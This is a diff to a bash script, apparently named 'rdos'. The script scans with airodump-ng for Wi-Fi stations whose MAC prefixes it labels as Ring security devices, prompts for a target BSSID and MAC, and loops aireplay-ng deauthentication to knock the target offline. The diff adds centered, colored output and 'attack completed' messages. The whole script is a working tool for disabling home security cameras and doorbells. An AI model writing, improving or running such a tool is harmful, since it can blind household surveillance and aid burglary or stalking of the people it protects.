@@ -19,10 +19,22 @@ ascii_art() {
 EOF
 }
 
-# Call the function to display the ASCII art
-ascii_art
+# Function for centering text 
+print_centered_text() {
+    local text="$1"
+    local term_width=$(tput cols)
+    local padding_length=$(( (term_width - ${#text}) / 2 ))
+    local padding=""
+    for ((i = 0; i < padding_length; i++)); do
+        padding+=" "
+    done
+    printf "${padding}${text}${padding}"
+}
 
-
+wireless_config() {
+    printf "Interface: $INF"
+    printf "Channel: $CHNL"
+}
 
 # Function to run when Ctrl+C is pressed
 custom_interrupt() {
@@ -52,7 +64,6 @@ airodump_scan() {
 trap custom_interrupt SIGINT
 
 # Prechecks before script runs
-
 # Check for root
 if [ "$EUID" -ne 0 ]; then 
     printf "Please run as root\n"
@@ -128,7 +139,7 @@ airodump_scan
 if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv; then
     while true; do
         clear
-        printf '\e[1m\e[31mNo ring devices found!\n\e[0m'
+        print_centered_text '\e[1;31mNo ring devices found!\e[0m'
         sleep 2
         read -p "Do you want to run the scan again?[y/n]: " choice1
         case "$choice1" in
@@ -139,7 +150,7 @@ if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/
                 airodump_scan
                 if grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv; then # Check if devices match the filter
                     clear
-                    printf '\e[31;1mRing devices found!\n\e[0m'
+                    print_centered_text '\e[1;31mRing devices found!\e[0m'
                     sleep 1
                     break
                 fi
@@ -155,16 +166,15 @@ if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/
 else
     # Print the header
     clear
-    printf '\e[31;1mRing devices found!\n\e[0m'
+    print_centered_text '\e[1;31mRing devices found!\e[0m'
     sleep 1
 fi
 
 
 # Aireplay attack start
 clear
-printf "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n"
+printf "\e[1;97mStation MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n\e[0m"
 grep --color -E '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv
-printf "\n"
 read -p "Enter BSSID of target: " BSSID
 read -p "Enter MAC of target: " MAC
 CHNL=$(awk -F, -v BSSID="$BSSID" '$0 ~ BSSID {split($0, fields, ",");channel = gensub(/[^0-9]+/, "", "g", fields[4]); if (channel <= 13) print channel}' /tmp/rdos/airodump*.csv)
@@ -175,7 +185,8 @@ clear
 
 
 while true; do
-    aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty)
+    printf "Attemping to dissasociate \e[1;97m$MAC\e[0m..."
+    aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF | tee /dev/tty) # Running the aireplay attack into a variable aireout so grep can read the output
     
     if echo "$aireout" | grep -q "No such BSSID available"; then
         while true; do
@@ -198,6 +209,7 @@ while true; do
             esac
         done
     else
+        printf "Dissasociation attack completed successfully"
         break
     fi
 done
